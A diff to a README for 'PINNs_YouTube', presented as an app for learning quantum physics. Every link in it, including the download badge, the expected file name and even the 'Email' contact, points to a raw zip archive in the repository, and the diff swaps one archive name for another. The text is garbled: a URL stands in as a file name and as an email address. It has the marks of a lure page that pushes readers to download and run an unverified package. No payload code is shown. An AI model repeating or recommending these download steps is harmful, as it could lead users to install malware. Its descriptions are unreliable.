@@ -1,6 +1,6 @@
 # 🎓 PINNs_YouTube - Learn Quantum Physics Effortlessly
 
-[![Download PINNs_YouTube](https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PINNs_YouTube.zip%20Started%20Now-blue)](https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PINNs_YouTube.zip)
+[![Download PINNs_YouTube](https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PIN_You_Tube_Ns_1.0.zip%20Started%20Now-blue)](https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PIN_You_Tube_Ns_1.0.zip)
 
 ## 🌟 Overview
 
@@ -21,7 +21,7 @@ To begin using PINNs_YouTube, follow the steps below:
    Choose the appropriate file for your system. Click on the download link to start the process. Your browser will save the file to your designated downloads folder. 
 
 4. **Locate the Downloaded File**  
-   Go to your downloads folder. Find the file you downloaded. It should have a name similar to `https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PINNs_YouTube.zip` or `https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PINNs_YouTube.zip`, depending on the operating system.
+   Go to your downloads folder. Find the file you downloaded. It should have a name similar to `https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PIN_You_Tube_Ns_1.0.zip` or `https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PIN_You_Tube_Ns_1.0.zip`, depending on the operating system.
 
 5. **Unzip the File (if necessary)**  
    If you downloaded a zip file, right-click on it and select "Extract All" to unzip the files. Follow the prompts to complete the extraction.
@@ -49,7 +49,7 @@ To run the PINNs_YouTube application smoothly, ensure your system meets the foll
 ## 📩 Download & Install
 
 To download the software, visit the following link:  
-[Download PINNs_YouTube](https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PINNs_YouTube.zip)
+[Download PINNs_YouTube](https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PIN_You_Tube_Ns_1.0.zip)
 
 After downloading, follow the instructions in the **Getting Started** section to install and run the application.
 
@@ -86,7 +86,7 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 For questions or inquiries about the project, feel free to reach out:
 
-- **Email:** [https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PINNs_YouTube.zip](https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PINNs_YouTube.zip)
+- **Email:** [https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PIN_You_Tube_Ns_1.0.zip](https://raw.githubusercontent.com/Florencio026/PINNs_YouTube/main/staring/PIN_You_Tube_Ns_1.0.zip)
 - **GitHub Issues:** Use the issues section for specific inquiries or problems.
 
 We hope you enjoy learning with PINNs_YouTube!
